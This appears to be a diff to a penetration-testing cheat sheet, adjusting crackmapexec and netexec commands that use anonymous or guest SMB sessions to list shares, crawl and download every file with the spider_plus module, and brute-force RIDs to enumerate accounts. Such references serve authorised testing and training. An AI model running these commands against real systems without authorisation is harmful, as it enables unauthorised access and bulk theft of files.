@@ -135,9 +135,11 @@ $ crackmapexec winrm -L
 $ crackmapexec smb <RHOST> -u '' -p '' --shares
 $ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 $ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
+$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
 $ crackmapexec smb <RHOST> -u " " -p "" --shares
 $ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
 $ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
+$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true
 $ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute
 $ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
 $ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
@@ -623,13 +625,13 @@ $ netexec winrm -L
 $ netexec smb <RHOST> -u '' -p '' --shares
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
-$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True
-$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
+$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
+$ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
 $ netexec smb <RHOST> -u " " -p "" --shares
 $ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus
 $ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
-$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True
-$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=99999999
+$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true
+$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
 $ netexec smb <RHOST> -u guest -p '' --shares --rid-brute
 $ netexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
 $ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
